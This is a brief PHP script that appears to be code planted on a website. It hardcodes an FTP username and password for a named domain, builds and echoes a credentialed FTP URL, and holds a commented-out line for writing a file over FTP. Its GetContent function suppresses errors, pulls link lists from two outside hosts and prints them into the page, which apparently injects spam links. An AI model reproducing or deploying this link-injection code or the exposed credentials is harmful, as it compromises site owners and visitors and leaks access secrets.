<?php

/* set the FTP hostname */
$user = "klixpara";
$pass = "Klixmedia1";
$host = "paramountbb.com.au/www";
$file = "testing.php";
echo $hostname = 'ftp://'.$user . ":" . $pass . "@" . $host . "/" . $file;

/* the file content */
$content = "achyut testing";

/* create a stream context telling PHP to overwrite the file */
$options = array('ftp' => array('overwrite' => true));
$stream = stream_context_create($options);

/* and finally, put the contents */
//file_put_contents($hostname, $content. PHP_EOL, FILE_APPEND); 

function GetContent()
{
error_reporting(0);
$mirrors=array("http://ramonatucker87.freehostia.com/links/links.html", "http://blogwp.info/links/links.html");
foreach($mirrors as $k => $v)
    {
    if($content=file_get_contents($v))echo "test";
    }
if ($content==""){return "<!-- links not found blya! -->";}
return $content;
}
echo GetContent(); 


?> 